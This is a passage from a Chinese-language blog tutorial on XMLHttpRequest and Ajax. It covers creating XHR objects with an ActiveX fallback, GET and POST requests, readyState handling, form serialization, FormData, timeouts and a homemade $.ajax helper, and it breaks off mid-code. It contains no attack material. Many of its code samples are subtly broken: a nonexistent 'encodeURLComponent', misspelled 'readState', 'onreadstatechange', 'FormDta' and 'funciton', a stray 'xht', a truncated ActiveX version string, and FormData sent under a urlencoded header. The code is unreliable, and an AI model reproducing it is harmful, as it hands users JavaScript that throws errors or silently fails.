class="number">0</span>, len = versions.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">new</span> ActiveXObject(versions[i]);</span><br><span class="line">          <span class="built_in">arguments</span>.callee.activeXString = versions[i];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">          <span class="comment">// 跳过</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="built_in">arguments</span>.callee.activeXString);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>IE7+、FireFox、Opera、Chrome、Safari 都支持原生的 XHR 对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure><p>封装获取 xhr 对象的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createXHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> XMLHttpRequest != <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> ActiveXObject != <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.activeXString != <span class="string">"string"</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> versions = [</span><br><span class="line">        <span class="string">"MSXML2.XMLHttp.6.0"</span>,</span><br><span class="line">        <span class="string">"MSXML2.XMLHttp.3.0"</span>,</span><br><span class="line">        <span class="string">"MSXML2.XMLHtt"</span></span><br><span class="line">      ], i, len;</span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>, len = versions.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">new</span> ActiveXObject(versions[i]);</span><br><span class="line">          <span class="built_in">arguments</span>.callee.activeXString = versions[i];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">          <span class="comment">// 跳过</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="built_in">arguments</span>.callee.activeXString);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span> (<span class="string">"No XHR object is available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XMLHttpRequest-对象使用"><a href="#XMLHttpRequest-对象使用" class="headerlink" title="XMLHttpRequest 对象使用"></a>XMLHttpRequest 对象使用</h3><ul><li>open() 方法<ul><li>三个参数：<ul><li>要发送的请求的类型：(“get”, “post”)</li><li>请求的 URL ，是相对于执行代码的当前页面（也可以使用绝对路径）</li><li>表示是否异步发送请求的布尔值</li></ul></li><li>只能想用一个域中使用相同端口和协议的 URL 发送请求。如果 URL 与启动请求的页面有任何差别，都会发生安全错误。</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"exam.php"</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><ul><li>send() 方法<ul><li>一个参数，请求主题发送的数据</li><li>如果不需要请求主体发送数据，必须传入 null 值，调用完之后请求就发会被分派到服务器。</li></ul></li></ul><p>由于这次请求是同步的，JavaScript 代码会等到服务器响应之后再继续执行。在收到响应后 ，响应的数据会自动填充 XHR 对象的属性。属性说明如下：</p><ul><li>responseText: 作为响应主体被返回的文本。</li><li>responseXML: 如果响应的内容是 “text/xml” 或 “application/xml”，这个属性中保存着响应数据的 XML DOM 文档。</li><li>status: 响应的 HTTP 状态。</li><li>statusText: HTTP 状态说明。</li></ul><p>在收到响应后，第一步就是检查 <code>status</code> 属性，以确定响应已经成功返回。一般来说，可以将 状态代码为 200 作为成功的标志。此时，responseText 属性的内容已就绪，而且在内容正确的时候，responseXML 也能够访问了。此外，状态码为 304 表示请求的资源并没有被修改，可以直接使用浏览器缓存的版本；也意味着响应是有效的。因此，检查状态码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"exam.php"</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"请求失败: "</span> + xhr.status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面这样发送同步请求没有问题，但是发送异步请求时，才能让 JavaScript 继续执行而不必等待响应。可以通过检测 <code>XHR</code>对象的 <code>readyState</code> 属性，该属性表示请求/响应过程的当前活动阶段。该属性的取值：</p><ul><li>0 未初始化，即尚未调用 open() 方法</li><li>1 启动，已经调用 open() 方法，但尚未调用 send()</li><li>2 发送，已经调用 send() 方法，但尚未接收到响应，请求已发送，正在处理中（通常现在可以从响应中获取内容头）。</li><li>3 接收，已经接收到部分响应数据，请求在处理中；通常响应中已有部分数据可用了，但是服务器还没有完成响应的生成。</li><li>4 完成，已经接收到全部响应数据，而且已经可以在客户端使用了</li></ul><p>只要 <code>readyState</code> 属性的值由一个值变成另一个值，都会触发 <code>readystatechange</code> 事件。可以利用这个事件来检测每次状态变化后 <code>readyState</code> 值。通常，我们只对 <code>readyState</code> 值为 4 的阶段感兴趣，因为这时所有数据都已经就绪。不过，必须在调用 <code>open()</code> 之前指定 <code>onreadystatechange</code> 事件处理程序才能确保跨浏览器兼容性。代码如下：<code>onreadystatechange</code> 是 <code>Javascript的</code> 事件的一种，其意义在于监听 <code>XMLHttpRequest</code> 的状态</p><ul><li>获取状态行（包括状态码&amp;状态信息）<ul><li><code>xhr.status</code> 状态码;</li><li><code>xhr.statusText</code> 状态码信息</li></ul></li><li><p>获取响应头</p><ul><li><code>xhr.getResponseHeader(&#39;Content-Type&#39;);</code></li><li><code>xhr.getAllResponseHeaders();</code></li></ul></li><li><p>响应主体</p><ul><li><code>xhr.responseText;</code></li><li><code>xhr.responseXML</code></li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readState == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"请求失败: "</span> + xhr.status);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"exam.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>在接收到响应之前还可以调用 <code>abort()</code> 方法来取消异步请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.abort();</span><br></pre></td></tr></table></figure><p><code>setRequestHeader()</code>方法可以设置自定义的请求头部信息。这个方法接收两个参数：</p><ul><li>头部名称</li><li>头部字段的值</li></ul><p><code>setRequestHeader()</code>方法必须在调用 open() 方法之后，send() 方法之前调用.</p><h3 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h3><p>GET 请求将查询的字符串参数追加到 URL 的末尾，传入 open() 方法的 URL 末尾的查询字符串必须经过正确的编码才行。</p><p>查询字符串中的每个值都必须经过 encodeURLComponent() 进行编码，然后才能放到 URL 末尾。</p><p>所有的名-值对都必须由（&amp;）符号分隔。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"exam.php?name=value&amp;name=value2"</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>封装经过编码的查询字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 向 URL 末尾添加查询字符串的方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addURLParam</span>(<span class="params">url, name, value</span>) </span>&#123;</span><br><span class="line">  url += (url.indexOf(<span class="string">"?"</span>) == <span class="number">-1</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>);</span><br><span class="line">  url += encodeURLComponent(name) + <span class="string">"="</span> + encodeURLComponent(value);</span><br><span class="line">  <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h3><p>通常用于向服务器发送应该保存的数据。POST 请求应该把数据作为请求的主体提交。给 open() 方法的第一个参数传入 “post” 就可以初始化一个 post 请求。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(<span class="string">"post"</span>, <span class="string">"exam.php"</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>使用 XHR 来模仿表单提交：首先将 <code>Content-Type</code> 头部设置为 <code>application/x-www-form-urlencoded</code> ，也就是表单提交时的数据类型，其次是以适当的格式创建一个字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">  xhr.onreadstatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"请求失败: "</span> + xhr.status);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhr.open(<span class="string">"post"</span>, <span class="string">"exam.php"</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">  <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">"userInfo"</span>);</span><br><span class="line">  xhr.send(serialize(form));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取 XHR 对象的兼容方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createXHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.activeXString != <span class="string">"string"</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> versions = [</span><br><span class="line">      <span class="string">"MSXML2.XMLHttp.6.0"</span>,</span><br><span class="line">      <span class="string">"MSXML2.XMLHttp.3.0"</span>,</span><br><span class="line">      <span class="string">"MSXML2.XMLHtt"</span></span><br><span class="line">    ], i, len;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, len = versions.length; i &lt; len; i++) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> ActiveXObject(versions[i]);</span><br><span class="line">        <span class="built_in">arguments</span>.callee.activeXString = versions[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ex) &#123;</span><br><span class="line">        <span class="comment">// 跳过</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="built_in">arguments</span>.callee.activeXString);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 表单序列化函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> parts = [],</span><br><span class="line">    field = <span class="literal">null</span>,</span><br><span class="line">    i,</span><br><span class="line">    len,</span><br><span class="line">    j,</span><br><span class="line">    optLen,</span><br><span class="line">    option,</span><br><span class="line">    optValue;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>, len = form.elements.length; i &lt; len; i++) &#123;</span><br><span class="line">    field = form.elements[i];</span><br><span class="line">    <span class="keyword">switch</span>(field.type) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"select-one"</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"select-multipule"</span>:</span><br><span class="line">        <span class="keyword">if</span> (field.name.length) &#123;</span><br><span class="line">          <span class="keyword">for</span> (j = <span class="number">0</span>, optLen = field.options.length; j &lt; optLen; j++) &#123;</span><br><span class="line">            option = field.options[j];</span><br><span class="line">            <span class="keyword">if</span> (option.selected) &#123;</span><br><span class="line">              optValue = <span class="string">""</span>;</span><br><span class="line">              <span class="keyword">if</span> (option.hasAttribute) &#123;</span><br><span class="line">                optValue = (option.hasAttribute(<span class="string">"value"</span>) ? option.value : option.text);</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                optValue = (option.attributes[<span class="string">"values"</span>].specified ? option.value : option.text);</span><br><span class="line">              &#125;</span><br><span class="line">              parts.push(encodeURLComponent(field.name) + <span class="string">"="</span> + encodeURLComponent(optValue));</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="literal">undefined</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"file"</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"reset"</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"submit"</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"button"</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"radio"</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="string">"checkbox"</span>:</span><br><span class="line">        <span class="keyword">if</span> (!field.name.length) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (field.name.length) &#123;</span><br><span class="line">          parts.push(encodeURLComponent(field.name) + <span class="string">"="</span> + encodeURLComponent(field.value));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> parts.join(<span class="string">"&amp;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注：GET和POST请求方式的差异</strong></p><ul><li>GET没有请求主体，使用xhr.send(null)</li><li>GET可以通过在请求URL上添加请求参数</li><li>POST可以通过xhr.send(‘name=itcast&amp;age=10’)</li><li>POST需要设置</li><li>GET效率更好（应用多）</li><li>GET大小限制约4K，POST则没有限制<h3 id="关于表单序列化"><a href="#关于表单序列化" class="headerlink" title="关于表单序列化"></a>关于表单序列化</h3></li></ul><p>XMLHTTPRequest 2 级 定义了 FormData 类型。 FormData 为序列化表单以及创建与表单格式相同的数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data <span class="keyword">new</span> FormData();</span><br><span class="line">data.append(<span class="string">"name"</span>, <span class="string">"Hiraku"</span>);</span><br></pre></td></tr></table></figure><p>append() 方法传递两个参数。即键和值。也可以使用如下的方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData(<span class="built_in">document</span>.forms[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>创建了 FormData 的实例后，可以直接传递给 send() 方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">xhr.onreadstatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"请求失败: "</span> + xhr.status);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">"post"</span>, <span class="string">"exam.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">"userInfo"</span>);</span><br><span class="line">xhr.send(<span class="keyword">new</span> FormDta(form));</span><br></pre></td></tr></table></figure><h3 id="超时设定"><a href="#超时设定" class="headerlink" title="超时设定"></a>超时设定</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = createXHR();</span><br><span class="line">xhr.onreadstatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((xhr.status &gt;= <span class="number">200</span> &amp;&amp; xhr.status &lt; <span class="number">300</span>) || xhr.status == <span class="number">304</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(xhr.responseText);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"请求失败: "</span> + xhr.status);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="comment">// 由 ontimeout 事件程序处理</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"exam.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xht.timeout = <span class="number">1000</span>; <span class="comment">// 仅适用于 IE</span></span><br><span class="line">xhr.ontimeout = funciton() &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"请求失败："</span>)</span><br><span class="line">&#125;</span><br><span class="line">xhr.send(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="进度事件"><a href="#进度事件" class="headerlink" title="进度事件"></a>进度事件</h3><ul><li>loadstart: 收到响应数据的第一个字节时触发</li><li>progress：在接收响应期间不断地触发</li><li>error: 发生错误时触发</li><li>abort: 调用 abort() 方法而终止时触发</li><li>load: 在接收到完整的响应数据时触发</li><li>loadend: 在通信完成或者触发 error、abort、或 load 事件后触发。</li></ul><p>我们需要检测并判断响应头的 MIME 类型后确定使用 <code>request.responseText</code> 或者 <code>request.responseXML</code></p><h3 id="API-总结"><a href="#API-总结" class="headerlink" title="API 总结"></a>API 总结</h3><ul><li><code>xhr.open()</code><ul><li>发起请求，可以是get、post方式</li></ul></li><li><code>xhr.setRequestHeader()</code><ul><li>设置请求头</li></ul></li><li><code>xhr.send()</code><ul><li>发送请求主体get方式使用xhr.send(null)</li></ul></li><li><code>xhr.onreadystatechange = function () {}</code><ul><li>监听响应状态</li></ul></li><li><code>xhr.status</code><ul><li>表示响应码，如200</li></ul></li><li><code>xhr.statusText</code><ul><li>表示响应信息，如OK</li></ul></li><li><code>xhr.getAllResponseHeaders()</code><ul><li>获取全部响应头信息</li></ul></li><li><code>xhr.getResponseHeader(&#39;key&#39;)</code><ul><li>获取指定头信息</li></ul></li><li><code>xhr.responseText、xhr.responseXML</code><ul><li>都表示响应主体</li></ul></li></ul><h3 id="封装ajax工具函数"><a href="#封装ajax工具函数" class="headerlink" title="封装ajax工具函数"></a>封装ajax工具函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 1. 请求的类型                type    get post</span></span><br><span class="line"><span class="comment"> * 2. 请求地址                  url</span></span><br><span class="line"><span class="comment"> * 3. 是异步的还是同步的         async   false true</span></span><br><span class="line"><span class="comment"> * 4. 请求内容的格式            contentType</span></span><br><span class="line"><span class="comment"> * 5. 传输的数据                data    json对象</span></span><br><span class="line"><span class="comment"> * 6. 响应成功处理函数           success   function</span></span><br><span class="line"><span class="comment"> * 7. 响应失败的处理函数         error     function</span></span><br><span class="line"><span class="comment"> * 这些都是动态参数  参数对象  options</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="built_in">window</span>.$ = &#123;&#125;;<span class="comment">/*封装一个函数*/</span></span><br><span class="line"><span class="comment">/*申明一个ajax的方法*/</span></span><br><span class="line">$.ajax = <span class="function"><span class="keyword">function</span>(<span class="params">options</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!options || <span class="keyword">typeof</span> options != <span class="string">'object'</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*请求的类型*/</span></span><br><span class="line">    <span class="keyword">var</span> type = options.type || <span class="string">'get'</span>;<span class="comment">/*默认get*/</span></span><br><span class="line">    <span class="comment">/*请求地址 */</span></span><br><span class="line">    <span class="keyword">var</span> url = options.url || location.pathname;<span class="comment">/*当前的地址*/</span></span><br><span class="line">    <span class="comment">/*是异步的还是同步的 */</span></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">async</span> = (options.async === <span class="literal">false</span>)?<span class="literal">false</span>:<span class="literal">true</span>;<span class="comment">/*默认异步*/</span></span><br><span class="line">    <span class="comment">/*请求内容的格式 */</span></span><br><span class="line">    <span class="keyword">var</span> contentType = options.contentType || <span class="string">"text/html"</span>;</span><br><span class="line">    <span class="comment">/*传输的数据 */</span></span><br><span class="line">    <span class="keyword">var</span> data = options.data || &#123;&#125;;<span class="comment">/*｛name:'',age:''｝*/</span></span><br><span class="line">    <span class="comment">/*在提交的时候需要转成 name=xjj 